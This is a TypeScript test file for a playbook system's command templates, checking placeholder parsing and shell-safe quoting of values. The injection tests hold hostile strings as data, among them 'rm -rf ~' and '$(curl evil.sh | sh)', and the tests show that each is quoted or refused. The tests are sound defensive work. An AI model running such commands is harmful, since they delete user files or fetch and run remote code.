/**
 * 3.15 command workflows — `kind: command` playbooks (src/core/playbooks/
 * command-template.ts + parse / store / resolve / lanes, and the Verse
 * playbooks routes).
 *
 * The contract under test:
 *   - `{{name}}` / `{{name:default}}` holes parse; malformed ones are clear errors;
 *   - a filled value is ONE shell word: simple words raw, everything else
 *     single-quoted; control characters (newlines!) are refused, never pasted;
 *   - a hole inside quotes / backticks / a here-document is a parse error;
 *   - a command workflow round-trips through parse ⇄ serialize and the store,
 *     carries `kind` + template + params on its summary, and NO agent lane
 *     ever resolves it (explicit, `!macro`, auto, the Leader's catalog);
 *   - old playbooks without `kind` are agent playbooks, byte-for-byte as before.
 *
 * HOME is isolated by the global setup; each test also starts from an empty ~/.ashlr.
 */
import { rmSync } from 'node:fs';
import type { IncomingMessage, ServerResponse } from 'node:http';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { Readable } from 'node:stream';
import { beforeEach, describe, expect, it } from 'vitest';

import { BUILTIN_PLAYBOOK_SOURCES } from '../src/core/playbooks/builtins.js';
import {
  CommandTemplateError,
  commandValueIssues,
  extractCommandFence,
  fillCommandTemplate,
  parseCommandTemplate,
  previewCommandTemplate,
  quoteShellValue,
} from '../src/core/playbooks/command-template.js';
import { chatPlaybook, leaderPlaybookCatalog, playbookForLaunch, withFleetPlaybook } from '../src/core/playbooks/lanes.js';
import { canonicalizePlaybook, parsePlaybook, playbookTemplate, serializePlaybook } from '../src/core/playbooks/parse.js';
import { choosePlaybook, registerPlaybookAutoMatcher, renderPlaybookBlock, resolvePlaybook, resolvePlaybookSync } from '../src/core/playbooks/resolve.js';
import { getPlaybook, listLatestPlaybooks, listPlaybookSummaries, savePlaybook } from '../src/core/playbooks/store.js';
import { VERSE_PLAYBOOKS_PATH, type PlaybookV1 } from '../src/core/playbooks/types.js';
import { handlePlaybooksApi } from '../src/core/verse/playbooks-api.js';
import type { VerseApiContext } from '../src/core/verse/verse-api.js';

function workflow(over: { id?: string; body?: string; front?: string[] } = {}): string {
  const id = over.id ?? 'new-branch';
  return [
    '---',
    `id: ${id}`,
    'name: New branch',
    'description: Branch off and push.',
    'kind: command',
    ...(over.front ?? []),
    '---',
    '',
    '## Command',
    '',
    over.body ?? '```sh\ngit switch -c {{branch}} && git push -u {{remote:origin}} {{branch}}\n```',
    '',
  ].join('\n');
}

beforeEach(() => {
  rmSync(join(homedir(), '.ashlr'), { recursive: true, force: true });
  registerPlaybookAutoMatcher(null);
});

// ---------------------------------------------------------------------------
// Template parsing
// ---------------------------------------------------------------------------

describe('parseCommandTemplate', () => {
  it('finds holes in order, deduplicated, with defaults (empty and colon-bearing ones too)', () => {
    const t = parseCommandTemplate('gh pr list --state {{state:open}} --limit {{ limit : 20 }} {{flags:}} {{url:https://x.io:8080/a}} {{state}}');
    expect(t.errors).toEqual([]);
    expect(t.params).toEqual([
      { name: 'state', default: 'open' },
      { name: 'limit', default: '20' },
      { name: 'flags', default: '' },
      { name: 'url', default: 'https://x.io:8080/a' },
    ]);
  });

  it('a later default fills an earlier bare use; two different defaults are an error', () => {
    expect(parseCommandTemplate('echo {{a}} {{a:x}}').params).toEqual([{ name: 'a', default: 'x' }]);
    expect(parseCommandTemplate('echo {{a:x}} {{a:y}}').errors).toEqual(['`a` has two different defaults.']);
  });

  it('rejects malformed placeholders with a clear message, and `\\{{` is a literal', () => {
    expect(parseCommandTemplate("docker ps --format '{{.Names}}'").errors[0]).toMatch(/`\{\{\.Names\}\}` is not a placeholder.*\\\{\{/);
    expect(parseCommandTemplate('echo {{9lives}}').errors[0]).toMatch(/not a placeholder/);
    expect(parseCommandTemplate('echo {{}}').errors[0]).toMatch(/not a placeholder/);
    expect(parseCommandTemplate(`echo {{${'a'.repeat(33)}}}`).errors[0]).toMatch(/not a placeholder/);
    expect(parseCommandTemplate('echo {{name').errors[0]).toMatch(/Line 1: `\{\{` is never closed/);
    expect(parseCommandTemplate('echo ok\necho {{a\nb}}').errors[0]).toMatch(/Line 2: a placeholder must fit on one line/);
    const literal = parseCommandTemplate("docker ps --format \\{{.Names}} {{filter:status=running}}");
    expect(literal.errors).toEqual([]);
    expect(literal.params).toEqual([{ name: 'filter', default: 'status=running' }]);
    expect(fillCommandTemplate('docker ps --format \\{{.Names}} --filter {{filter:status=running}}', {})).toBe('docker ps --format {{.Names}} --filter status=running');
  });

  it('caps the number of distinct holes at 20', () => {
    const many = Array.from({ length: 21 }, (_, i) => `{{p${i}}}`).join(' ');
    expect(parseCommandTemplate(`echo ${many}`).errors).toContain('At most 20 different placeholders.');
    expect(parseCommandTemplate(`echo ${Array.from({ length: 20 }, (_, i) => `{{p${i}}}`).join(' ')}`).errors).toEqual([]);
  });

  it('refuses holes where single-quoting would not be sound', () => {
    const quoted = (t: string) => parseCommandTemplate(t).errors.join(' ');
    expect(quoted('echo "hello {{name}}"')).toMatch(/inside quotes — put it outside them/);
    expect(quoted("echo 'hello {{name}}'")).toMatch(/inside quotes/);
    expect(quoted("echo $'x{{name}}'")).toMatch(/inside quotes/);
    expect(quoted('echo `ls {{dir}}`')).toMatch(/inside backticks/);
    expect(quoted('cat <<EOF\nhello {{name}}\nEOF')).toMatch(/here-document/);
    expect(quoted('cat <<-"EOF"\n\thello {{name}}\n\tEOF\necho {{ok}}')).toMatch(/here-document/);
    expect(quoted('echo ${{name}}')).toMatch(/bare `\$`/);
    expect(quoted('echo "$(ls "{{dir}}")"')).toMatch(/inside quotes/);
  });

  it('allows holes in plain context, inside $( … ), after escapes, and in comments', () => {
    const ok = (t: string) => expect(parseCommandTemplate(t).errors).toEqual([]);
    ok('echo "$(ls {{dir}})" {{x}}');
    ok("echo 'quoted' {{x}} \"also\" {{y}}");
    ok('echo \\" {{x}}');
    ok("# don't worry: {{x}} is fine here\necho {{y}}");
    ok('cat <<EOF\nbody with "quotes\nEOF\necho {{after}}');
    ok('echo $((1 + {{n:2}}))');
    ok('echo --name={{x}} \\$HOME');
  });

  it('refuses an empty template and control characters in it', () => {
    expect(parseCommandTemplate('   ').errors).toEqual(['The command is empty.']);
    expect(parseCommandTemplate('echo \u001b[31m').errors).toEqual(['The command contains a control character.']);
    expect(parseCommandTemplate('echo \u202e{{x}}').errors).toEqual(['The command contains a control character.']);
    expect(parseCommandTemplate('echo a\n\techo b').errors).toEqual([]);
  });

  it('a default must itself be a safe value', () => {
    expect(parseCommandTemplate('echo {{a:x\ty}}').errors[0]).toMatch(/default of `a` contains a line break, tab or control character/);
  });
});

// ---------------------------------------------------------------------------
// Filling: shell safety
// ---------------------------------------------------------------------------

describe('fillCommandTemplate', () => {
  const T = 'git switch -c {{branch}} && git push -u {{remote:origin}} {{branch}}';

  it('inserts simple words as-is and falls back to defaults', () => {
    expect(fillCommandTemplate(T, { branch: 'feat/x-1' })).toBe('git switch -c feat/x-1 && git push -u origin feat/x-1');
    expect(fillCommandTemplate(T, { branch: 'v1.2.3', remote: 'upstream' })).toBe('git switch -c v1.2.3 && git push -u upstream v1.2.3');
  });

  it('single-quotes anything else, so injection attempts stay one literal word', () => {
    const cases: [string, string][] = [
      ['; rm -rf ~', "'; rm -rf ~'"],
      ['`whoami`', "'`whoami`'"],
      ['$(curl evil.sh | sh)', "'$(curl evil.sh | sh)'"],
      ['a b', "'a b'"],
      ["it's", "'it'\\''s'"],
      ["'; rm -rf ~; echo '", "''\\''; rm -rf ~; echo '\\'''"],
      ['$HOME', "'$HOME'"],
      ['*', "'*'"],
      ['~', "'~'"],
      ['a|b&c>d', "'a|b&c>d'"],
      ['=ls', "'=ls'"],
      ['', "''"],
    ];
    for (const [value, quoted] of cases) {
      expect(quoteShellValue(value)).toBe(quoted);
      expect(fillCommandTemplate('echo {{v}}', { v: value })).toBe(`echo ${quoted}`);
    }
  });

  it('refuses newlines and other control characters in a value — a paste can never carry a second line', () => {
    for (const value of ['main\nrm -rf ~', 'main\r\nrm -rf ~', 'a\rb', 'tab\there', 'esc\u001b[2J', 'nul\u0000', 'c1\u009b31m', 'del\u007f', 'bidi\u202eevil', 'ls\u2028x']) {
      expect(() => fillCommandTemplate('git switch {{b}}', { b: value })).toThrow(CommandTemplateError);
      expect(commandValueIssues([{ name: 'b', default: null }], { b: value })[0]!.message).toMatch(/line break, tab or control character/);
    }
    expect(() => fillCommandTemplate('echo {{v}}', { v: 'x'.repeat(1025) })).toThrow(/longer than 1024/);
  });

  it('refuses to fill an invalid template', () => {
    expect(() => fillCommandTemplate('echo "{{v}}"', { v: 'x' })).toThrow(/inside quotes/);
  });

  it('never ends with a newline (the paste must not submit)', () => {
    expect(fillCommandTemplate('echo {{v}}\n\n', { v: 'x' })).toBe('echo x');
    expect(fillCommandTemplate('make build \\\n  TARGET={{t:web}}\n', {})).toBe('make build \\\n  TARGET=web');
  });

  it('only reads own string values (a hole named like an Object method is still a hole)', () => {
    expect(fillCommandTemplate('echo {{constructor}} {{toString:x}}', {})).toBe("echo '' x");
    expect(fillCommandTemplate('echo {{constructor}}', { constructor: 'ok' } as Record<string, string>)).toBe('echo ok');
  });

  it('flags a required hole left empty', () => {
    const params = parseCommandTemplate(T).params;
    expect(commandValueIssues(params, {})).toEqual([{ name: 'branch', message: 'Fill in `branch`.', required: true }]);
    expect(commandValueIssues(params, { branch: 'x', remote: '' })).toEqual([]);
  });

  it('previews holes as their defaults or <name>', () => {
    expect(previewCommandTemplate(T)).toBe('git switch -c <branch> && git push -u origin <branch>');
    expect(previewCommandTemplate(T, { branch: 'a b', remote: '' })).toBe("git switch -c 'a b' && git push -u '' 'a b'");
    expect(previewCommandTemplate(T, { branch: 'x\ny' })).toBe('git switch -c <branch> && git push -u origin <branch>');
  });
});

describe('extractCommandFence', () => {
  it('takes exactly one fenced block, any fence style', () => {
    expect(extractCommandFence('```sh\nls\n```')).toEqual({ ok: true, template: 'ls' });
    expect(extractCommandFence('\n~~~bash\nls -la\npwd\n~~~\n')).toEqual({ ok: true, template: 'ls -la\npwd' });
    expect(extractCommandFence('````\necho ```\n````')).toEqual({ ok: true, template: 'echo ```' });
    expect(extractCommandFence('ls')).toMatchObject({ ok: false });
    expect(extractCommandFence('```\nls\n```\nmore text')).toMatchObject({ ok: false, error: expect.stringMatching(/exactly one code block/) });
    expect(extractCommandFence('```\nls\n')).toMatchObject({ ok: false, error: expect.stringMatching(/never closed/) });
    expect(extractCommandFence('```\n\n```')).toMatchObject({ ok: false, error: expect.stringMatching(/empty/) });
  });
});

// ---------------------------------------------------------------------------
// Playbook parsing
// ---------------------------------------------------------------------------

describe('kind: command playbooks', () => {
  it('parse without Outcome / Procedure and carry the template + params', () => {
    const parsed = parsePlaybook(workflow());
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.meta.kind).toBe('command');
    expect(parsed.meta.command).toEqual({
      template: 'git switch -c {{branch}} && git push -u {{remote:origin}} {{branch}}',
      params: [{ name: 'branch', default: null }, { name: 'remote', default: 'origin' }],
    });
    expect(parsed.sections).toEqual({});
  });

  it('round-trips through serialize, keeping a multi-line template and a backtick-bearing one', () => {
    for (const body of ['```sh\nmake build \\\n  TARGET={{t:web}}\n```', '````bash\necho \'```\' {{x}}\n## not a heading\n````']) {
      const c = canonicalizePlaybook(workflow({ body }));
      expect(c.ok).toBe(true);
      if (!c.ok) return;
      const again = parsePlaybook(c.source!);
      expect(again.ok && again.meta).toEqual(c.meta);
      expect(canonicalizePlaybook(c.source!).source).toBe(c.source);
    }
  });

  it('refuses agent sections, a missing or malformed Command, bad holes and auto', () => {
    const errs = (source: string) => { const p = parsePlaybook(source); return p.ok ? [] : p.errors.map((e) => e.message).join(' | '); };
    expect(errs(workflow({ body: '```sh\nls\n```\n\n## Outcome\n\nDone.' }))).toMatch(/one section, “## Command” — not “## Outcome”/);
    expect(errs(workflow({ body: '' }).replace('## Command\n', ''))).toMatch(/“## Command” is required/);
    expect(errs(workflow({ body: 'just ls' }))).toMatch(/one fenced code block/);
    expect(errs(workflow({ body: '```sh\necho "{{x}}"\n```' }))).toMatch(/inside quotes/);
    expect(errs(workflow({ front: ['auto: true', 'kinds: [fix]'] }))).toMatch(/never auto-matched/);
    expect(errs(workflow({ front: [] }).replace('kind: command', 'kind: script'))).toMatch(/`kind` is `agent` or `command`/);
  });

  it('drops agent-only keys with a warning', () => {
    const parsed = parsePlaybook(workflow({ front: ['kinds: [fix]', 'budget-usd: 3', 'done-when:', '  - tests pass'] }));
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.warnings.map((w) => w.message)).toEqual(['`kinds`, `done-when`, `budget-usd` do not apply to a command workflow and will be dropped.']);
    expect(parsed.meta).toMatchObject({ taskKinds: [], doneWhen: [], budget: { usd: null, minutes: null }, auto: false });
  });

  it('an agent playbook may not carry a ## Command section', () => {
    const source = BUILTIN_PLAYBOOK_SOURCES[0]!.trimEnd() + '\n\n## Command\n\n```sh\nls\n```\n';
    const p = parsePlaybook(source);
    expect(p.ok ? '' : p.errors.map((e) => e.message).join(' ')).toMatch(/belongs to a command workflow/);
  });

  it('old playbooks (no kind key) are agent playbooks, canonical form unchanged', () => {
    for (const raw of BUILTIN_PLAYBOOK_SOURCES) {
      const c = canonicalizePlaybook(raw);
      expect(c.ok).toBe(true);
      if (!c.ok) continue;
      expect(c.meta.kind).toBe('agent');
      expect(c.source).not.toContain('kind:');
      expect(serializePlaybook(c.meta, c.sections)).toBe(c.source);
    }
    const explicit = parsePlaybook(BUILTIN_PLAYBOOK_SOURCES[0]!.replace('---\n', '---\nkind: agent\n'));
    expect(explicit.ok && explicit.meta.kind).toBe('agent');
  });

  it('playbookTemplate(id, "command") is a valid command workflow', () => {
    const p = parsePlaybook(playbookTemplate('my-command', 'command'));
    expect(p.ok && p.meta.kind).toBe('command');
    expect(p.ok && p.meta.command!.params.map((x) => x.name)).toEqual(['branch', 'remote']);
  });
});

// ---------------------------------------------------------------------------
// Store + resolution: no agent lane ever picks a command workflow
// ---------------------------------------------------------------------------

describe('store and lanes', () => {
  it('saves, lists with kind + template, and refuses a kind change across versions', async () => {
    const saved = await savePlaybook(workflow(), { createOnly: true });
    expect(saved.ok).toBe(true);
    const rows = await listPlaybookSummaries();
    const row = rows.find((r) => r.id === 'new-branch')!;
    expect(row).toMatchObject({ kind: 'command', command: { template: expect.stringContaining('{{branch}}'), params: [{ name: 'branch', default: null }, { name: 'remote', default: 'origin' }] } });
    expect(rows.find((r) => r.id === 'fix-issue')).toMatchObject({ kind: 'agent' });
    expect(rows.find((r) => r.id === 'fix-issue')).not.toHaveProperty('command');

    const pb = await getPlaybook('new-branch');
    expect(pb?.meta.kind).toBe('command');
    const asAgent = BUILTIN_PLAYBOOK_SOURCES[0]!.replace(/^id: .*$/m, 'id: new-branch').replace(/^macro: .*$/m, 'macro: !new-branch');
    const flipped = await savePlaybook(asAgent, { editOnly: true });
    expect(flipped).toMatchObject({ ok: false, errors: [{ field: 'kind', message: expect.stringMatching(/kind cannot change/) }] });
    const shipped = await savePlaybook(workflow({ id: 'fix-issue' }), { editOnly: true });
    expect(shipped).toMatchObject({ ok: false, errors: [{ field: 'kind' }] });
  });

  it('is never resolved: not by !macro, not explicitly, not by auto or a matcher, and renders nothing', async () => {
    await savePlaybook(workflow({ id: 'deploy-now', front: ['macro: !deploy'] }), { createOnly: true });
    const catalog = await listLatestPlaybooks();
    const cmd = catalog.find((p) => p.meta.id === 'deploy-now')!;
    expect(cmd.meta.kind).toBe('command');

    expect(choosePlaybook(catalog, { text: 'please !deploy this', repo: null })).toBeNull();
    expect(choosePlaybook(catalog, { text: 'please !deploy-now', repo: null })).toBeNull();
    expect(choosePlaybook(catalog, { explicit: 'deploy-now', text: '', repo: null })).toEqual({ unknown: 'deploy-now', command: true });
    expect(choosePlaybook(catalog, { explicit: '!deploy', text: '', repo: null })).toEqual({ unknown: '!deploy', command: true });
    registerPlaybookAutoMatcher(() => ({ id: 'deploy-now', confidence: 1 }));
    expect(choosePlaybook(catalog, { text: 'deploy', repo: null })).toBeNull();
    registerPlaybookAutoMatcher(null);

    expect(renderPlaybookBlock(cmd)).toBe('');
    expect(resolvePlaybookSync({ text: '!deploy', repo: null })).toBeNull();
    expect(resolvePlaybookSync({ explicit: 'deploy-now', text: '', repo: null })).toBeNull();
    const outcome = await resolvePlaybook({ explicit: 'deploy-now', text: '', repo: null });
    expect(outcome).toEqual({ ok: false, error: expect.stringMatching(/is a command workflow/) });
    expect(await playbookForLaunch({ explicit: 'deploy-now', title: 't', prompt: 'p', repo: 'ashlrai/widget' })).toMatchObject({ ok: false });
    expect(await playbookForLaunch({ title: 't', prompt: '!deploy it', repo: 'ashlrai/widget' })).toEqual({ ok: true, ref: null, match: null, block: '' });

    const goal = 'Ship the widget.';
    expect(withFleetPlaybook(goal, { repo: 'ashlrai/widget', title: '!deploy', detail: '' }, 'run-1')).toBe(goal);
    expect(chatPlaybook('!deploy now', null)).toBeNull();
    expect(leaderPlaybookCatalog().map((r) => r.id)).not.toContain('deploy-now');
    // Agent playbooks still resolve as before.
    expect(resolvePlaybookSync({ text: 'Crash on start. !fix-bug', repo: null })?.playbook.meta.id).toBe('fix-issue');
  });

  it('a hand-built meta without kind is an agent playbook', () => {
    const parsed = parsePlaybook(BUILTIN_PLAYBOOK_SOURCES[0]!);
    if (!parsed.ok) throw new Error('builtin must parse');
    const { kind: _kind, ...legacyMeta } = parsed.meta;
    const legacy: PlaybookV1 = { v: 1, meta: legacyMeta, sections: parsed.sections, version: 1, sha: 'abcdefabcdef', source: '', createdAt: '', builtin: true };
    expect(renderPlaybookBlock(legacy)).toContain('## Playbook:');
  });
});

// ---------------------------------------------------------------------------
// Verse routes
// ---------------------------------------------------------------------------

const ctx = { cfg: {}, token: 'tok', allowDispatch: true } as unknown as VerseApiContext;

async function call(method: string, url: string, body?: unknown): Promise<{ status: number; body: Record<string, unknown> | null }> {
  const payload = body === undefined ? [] : [Buffer.from(JSON.stringify(body), 'utf8')];
  const req = Object.assign(Readable.from(payload), {
    method,
    url,
    headers: body === undefined ? {} : { 'content-type': 'application/json', 'x-ashlr-token': 'tok' },
  }) as unknown as IncomingMessage;
  let status = 0;
  let text = '';
  const res = {
    writeHead(code: number) { status = code; return res; },
    end(chunk?: string) { text = chunk ?? ''; return res; },
  } as unknown as ServerResponse;
  expect(await handlePlaybooksApi(ctx, req, res, new URL(url, 'http://localhost').pathname, method)).toBe(true);
  return { status, body: text ? JSON.parse(text) as Record<string, unknown> : null };
}

describe('/api/verse/playbooks with command workflows', () => {
  it('POST creates one; GET lists its kind + template; GET one renders the command for reading', async () => {
    const created = await call('POST', VERSE_PLAYBOOKS_PATH, { source: workflow() });
    expect(created.body).toMatchObject({ ok: true, playbook: { meta: { id: 'new-branch', kind: 'command' } } });

    const list = await call('GET', VERSE_PLAYBOOKS_PATH);
    const rows = list.body!['playbooks'] as { id: string; kind?: string; command?: { template: string } }[];
    expect(rows.find((r) => r.id === 'new-branch')).toMatchObject({ kind: 'command', command: { template: expect.stringContaining('git switch -c') } });
    expect(rows.find((r) => r.id === 'docs-sync')).toMatchObject({ kind: 'agent' });

    const one = await call('GET', `${VERSE_PLAYBOOKS_PATH}/new-branch`);
    expect(one.status).toBe(200);
    const rendered = String(one.body!['rendered']);
    expect(rendered).toContain('## Command workflow: New branch');
    expect(rendered).toContain('```sh\ngit switch -c {{branch}}');
    expect(rendered).toContain('- `branch` — required');
    expect(rendered).toContain('- `remote` — default `origin`');
  });

  it('POST of a bad command workflow is 200 {ok:false} with field errors', async () => {
    const bad = await call('POST', VERSE_PLAYBOOKS_PATH, { source: workflow({ body: "```sh\necho '{{x}}'\n```" }) });
    expect(bad.status).toBe(200);
    expect(bad.body).toMatchObject({ ok: false, errors: [{ field: 'Command', message: expect.stringMatching(/inside quotes/) }] });
  });
});
